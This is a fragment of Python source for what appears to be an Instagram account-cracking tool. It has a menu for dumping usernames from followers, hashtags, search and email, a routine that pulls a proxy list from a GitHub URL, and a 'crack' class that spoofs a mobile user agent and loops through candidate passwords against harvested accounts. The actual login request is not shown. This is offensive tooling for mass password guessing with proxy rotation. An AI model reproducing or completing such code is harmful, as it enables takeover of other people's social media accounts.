...
def ___menu___():
    ...
    print(f"{B}[{P}2{B}]{H} Dump Username {M}From Followers")
    print(f"{B}[{P}3{B}]{H} Dump Username {M}From Activity")
    print(f"{B}[{P}4{B}]{H} Dump Username {M}From Home")
    print(f"{B}[{P}5{B}]{H} Dump Username {M}From Hashtag")
    print(f"{B}[{P}6{B}]{H} Dump Username {M}From Search")
    print(f"{B}[{P}7{B}]{H} Dump Username {M}From Query")
    print(f"{B}[{P}8{B}]{H} Dump User {M}From Email")
...
def ___proxy___():
    try:
        ...
        ___roz = requests.get('https://raw.githubusercontent.com/MN4WN1-777/ignew/main/Data/proxy2.txt').text
        open('Data/proxy.txt', 'w').write(___roz)
    ___crack___()
# Crack
class ___crack___:
    ...
    def __main__(self, user, uid, pwx):
        try:
            ...
            ___useragent = ('Mozilla/5.0 (Linux; Android 11; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36')
        try:
            for pw in pwx:
                pw = pw.lower()
